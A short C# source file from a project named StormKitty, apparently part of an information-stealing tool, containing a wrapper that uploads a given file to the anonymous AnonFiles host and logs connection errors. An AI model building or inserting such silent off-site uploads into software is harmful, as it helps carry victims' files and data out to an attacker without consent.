using System;

namespace StormKitty
{
    internal sealed class AnonFiles
    {
        public static string Upload(string file, bool api = false)
        {
            try
            {
                return AnonFile.Api.Upload(file, api);
            }
            catch (Exception error)
            {
                Logging.Log("AnonFile Upload : Connection error\n" + error);
            }
            return null;
        }
    }
}
